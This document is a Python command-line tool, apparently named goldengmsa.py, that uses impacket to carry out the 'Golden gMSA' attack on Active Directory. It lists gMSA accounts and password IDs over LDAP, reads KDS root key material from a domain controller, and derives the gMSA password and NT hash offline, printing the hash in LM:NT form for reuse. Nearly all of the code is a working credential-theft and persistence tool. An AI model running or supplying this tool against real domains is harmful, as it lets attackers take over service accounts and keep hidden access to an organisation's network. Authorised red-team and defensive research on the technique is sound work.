#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.10"
# dependencies = [
#     "impacket>=0.13.0,<0.14",
#     "rich>=14.0,<15",
#     "typer>=0.16,<1",
# ]
# ///

# ─── How to run ───
# uv run goldengmsa.py --help
# ──────────────────

from __future__ import annotations

import base64
import binascii
import shlex
import uuid
from contextlib import closing
from typing import Annotated

import typer
from Cryptodome.Hash import MD4
from impacket.ldap.ldap import LDAPSessionError
from rich.console import Console

from goldengmsa_crypto import (
    BlobParseError,
    ManagedPasswordId,
    RootKey,
    compute_gmsa_password,
    parse_sid,
    post_process_password_buffer,
)
from goldengmsa_ldap import Credentials, DirectorySession
from goldengmsa_options import AesKey, DcHost, DcIp, Hashes, Kerberos, NoPass, OptionalTarget, Target
from goldengmsa_readers_cli import readers

app = typer.Typer(no_args_is_help=True, pretty_exceptions_show_locals=False, rich_markup_mode=None)
app.command()(readers)
console = Console()


def _decode_base64(value: str, option_name: str) -> bytes:
    try:
        return base64.b64decode(value, validate=True)
    except (binascii.Error, ValueError) as error:
        raise typer.BadParameter(f"{option_name} must be valid Base64") from error


def _credentials(
    target: str,
    hashes: str | None,
    no_pass: bool,
    aes_key: str | None,
    kerberos: bool,
) -> Credentials:
    try:
        return Credentials.parse(target, hashes, no_pass, aes_key, kerberos)
    except ValueError as error:
        raise typer.BadParameter(str(error), param_hint="target") from error


def _print_command(
    title: str,
    command: list[str],
    options: list[tuple[str, str | None]],
) -> None:
    lines = [shlex.join(command)]
    lines.extend(f"  {flag}" if value is None else f"  {flag} {shlex.quote(value)}" for flag, value in options)
    console.print(f"\n{title}")
    console.print(" \\\n".join(lines), soft_wrap=True)


@app.command()
def gmsainfo(
    target: Target,
    sid: Annotated[str | None, typer.Option(help="Only return the gMSA with this SID.")] = None,
    domain: Annotated[str | None, typer.Option(help="Domain to query; defaults to the authentication domain.")] = None,
    hashes: Hashes = None,
    no_pass: NoPass = False,
    kerberos: Kerberos = False,
    aes_key: AesKey = None,
    dc_ip: DcIp = None,
    dc_host: DcHost = None,
) -> None:
    credentials = _credentials(target, hashes, no_pass, aes_key, kerberos)
    try:
        with closing(DirectorySession.connect(credentials, domain or credentials.domain, dc_ip, dc_host)) as session:
            records = session.find_gmsas(sid)
        if sid is not None and not records:
            raise LookupError(f"no gMSA found for SID {sid}")
        for record in records:
            password_id = ManagedPasswordId.from_bytes(record.password_id)
            identifier = uuid.UUID(bytes_le=password_id.identifier)
            encoded_password_id = base64.b64encode(record.password_id).decode("ascii")
            console.print(f"Account: {record.name}")
            console.print(f"SID (--sid): {record.sid}")
            console.print(f"Root key GUID (--guid): {identifier}")
            console.print(f"Password ID (--pwdid): {encoded_password_id}", soft_wrap=True)
            safe_identity = (
                f"{credentials.domain}/{credentials.username}" if credentials.username else credentials.domain
            )
            safe_target = (
                f"{safe_identity}@{credentials.target_host}" if credentials.target_host is not None else safe_identity
            )
            _print_command(
                "Retrieve the matching KDS key:",
                [
                    "./goldengmsa.py",
                    "kdsinfo",
                    safe_target,
                ],
                [
                    ("--guid", str(identifier)),
                    ("--sid", record.sid),
                    ("--pwdid", encoded_password_id),
                    ("--show-secrets", None),
                ],
            )
            console.print("-" * 46)
    except OSError as error:
        raise typer.BadParameter(f"LDAP connection failed: {error.strerror or error}") from error
    except (BlobParseError, LDAPSessionError, LookupError, ValueError) as error:
        raise typer.BadParameter(f"LDAP query failed: {error}") from error


@app.command()
def kdsinfo(
    target: Target,
    guid: Annotated[uuid.UUID | None, typer.Option(help="Only return this KDS root key.")] = None,
    sid: Annotated[str | None, typer.Option(help="gMSA SID from gmsainfo; used to print a compute command.")] = None,
    pwdid: Annotated[
        str | None,
        typer.Option(help="Base64 password ID from gmsainfo; used to print a compute command."),
    ] = None,
    forest: Annotated[str | None, typer.Option(help="Forest DNS domain to query.")] = None,
    hashes: Hashes = None,
    no_pass: NoPass = False,
    kerberos: Kerberos = False,
    aes_key: AesKey = None,
    dc_ip: DcIp = None,
    dc_host: DcHost = None,
    show_secrets: Annotated[
        bool,
        typer.Option("--show-secrets", help="Acknowledge that KDS root-key material will be printed."),
    ] = False,
) -> None:
    if not show_secrets:
        raise typer.BadParameter("--show-secrets is required because this command prints KDS root-key material")
    if (sid is None) != (pwdid is None):
        raise typer.BadParameter("--sid and --pwdid must be supplied together")
    try:
        password_id = None
        if sid is not None and pwdid is not None:
            parse_sid(sid)
            password_id = ManagedPasswordId.from_bytes(_decode_base64(pwdid, "--pwdid"))
    except (BlobParseError, ValueError) as error:
        raise typer.BadParameter(str(error)) from error
    password_id_guid = uuid.UUID(bytes_le=password_id.identifier) if password_id is not None else None
    if guid is not None and password_id_guid is not None and guid != password_id_guid:
        raise typer.BadParameter("--guid does not match the root key GUID encoded in --pwdid")
    requested_guid = guid or password_id_guid
    credentials = _credentials(target, hashes, no_pass, aes_key, kerberos)
    try:
        with closing(DirectorySession.connect(credentials, forest or credentials.domain, dc_ip, dc_host)) as session:
            records = session.find_root_keys(requested_guid)
        if requested_guid is not None and not records:
            raise LookupError(f"no KDS root key found for GUID {requested_guid}")
        for record in records:
            encoded_root_key = base64.b64encode(record.root_key.to_bytes()).decode("ascii")
            console.print(f"Root key GUID (--guid): {record.identifier}")
            console.print(f"KDS key (--kdskey): {encoded_root_key}", soft_wrap=True)
            if sid is not None and pwdid is not None:
                _print_command(
                    "Compute the gMSA credentials offline:",
                    [
                        "./goldengmsa.py",
                        "compute",
                    ],
                    [
                        ("--sid", sid),
                        ("--kdskey", encoded_root_key),
                        ("--pwdid", pwdid),
                        ("--show-secrets", None),
                    ],
                )
            else:
                console.print("\nSupply --sid and --pwdid from gmsainfo to print a complete compute command.")
            console.print("-" * 46)
    except OSError as error:
        raise typer.BadParameter(f"LDAP connection failed: {error.strerror or error}") from error
    except (BlobParseError, LDAPSessionError, LookupError, ValueError) as error:
        raise typer.BadParameter(f"LDAP query failed: {error}") from error


@app.command()
def compute(
    sid: Annotated[str, typer.Option(help="SID of the target gMSA.")],
    target: OptionalTarget = None,
    kdskey: Annotated[str | None, typer.Option(help="Base64-encoded KDS root key blob.")] = None,
    pwdid: Annotated[str | None, typer.Option(help="Base64-encoded msDS-ManagedPasswordId blob.")] = None,
    domain: Annotated[str | None, typer.Option(help="Domain containing the gMSA.")] = None,
    forest: Annotated[str | None, typer.Option(help="Forest DNS domain containing the KDS root key.")] = None,
    hashes: Hashes = None,
    no_pass: NoPass = False,
    kerberos: Kerberos = False,
    aes_key: AesKey = None,
    dc_ip: DcIp = None,
    dc_host: DcHost = None,
    show_secrets: Annotated[
        bool,
        typer.Option("--show-secrets", help="Acknowledge that gMSA credential material will be printed."),
    ] = False,
) -> None:
    if not show_secrets:
        raise typer.BadParameter("--show-secrets is required because this command prints gMSA credential material")
    try:
        credentials = _credentials(target, hashes, no_pass, aes_key, kerberos) if target is not None else None
        password_id = (
            ManagedPasswordId.from_bytes(_decode_base64(pwdid, "--pwdid"))
            if pwdid is not None
            else _fetch_password_id(credentials, domain, sid, dc_ip, dc_host)
        )
        root_key = (
            RootKey.from_bytes(_decode_base64(kdskey, "--kdskey"))
            if kdskey is not None
            else _fetch_root_key(credentials, forest or domain, password_id, dc_ip, dc_host)
        )
        password = compute_gmsa_password(sid, root_key, password_id)
    except OSError as error:
        raise typer.BadParameter(f"LDAP connection failed: {error.strerror or error}") from error
    except (BlobParseError, LDAPSessionError, LookupError, ValueError) as error:
        raise typer.BadParameter(str(error)) from error

    managed_password = post_process_password_buffer(password)
    nt_hash = MD4.new(managed_password[:-2]).hexdigest()
    console.print(f"NT Hash:\t\t{nt_hash}")
    console.print(f"NT Hash (LM:NT):\taad3b435b51404eeaad3b435b51404ee:{nt_hash}")
    console.print(
        f"Base64 Encoded Password:\t{base64.b64encode(password).decode('ascii')}",
        soft_wrap=True,
    )


def _fetch_password_id(
    credentials: Credentials | None,
    domain: str | None,
    sid: str,
    dc_ip: str | None,
    dc_host: str | None,
) -> ManagedPasswordId:
    if credentials is None:
        msg = "target is required when --pwdid is omitted"
        raise ValueError(msg)
    with closing(DirectorySession.connect(credentials, domain or credentials.domain, dc_ip, dc_host)) as session:
        records = session.find_gmsas(sid)
    if len(records) != 1:
        raise LookupError(f"expected one gMSA for SID {sid}, found {len(records)}")
    return ManagedPasswordId.from_bytes(records[0].password_id)


def _fetch_root_key(
    credentials: Credentials | None,
    forest: str | None,
    password_id: ManagedPasswordId,
    dc_ip: str | None,
    dc_host: str | None,
) -> RootKey:
    if credentials is None:
        msg = "target is required when --kdskey is omitted"
        raise ValueError(msg)
    identifier = uuid.UUID(bytes_le=password_id.identifier)
    with closing(DirectorySession.connect(credentials, forest or credentials.domain, dc_ip, dc_host)) as session:
        records = session.find_root_keys(identifier)
    if len(records) != 1:
        raise LookupError(f"expected one KDS root key {identifier}, found {len(records)}")
    return records[0].root_key


if __name__ == "__main__":
    app()
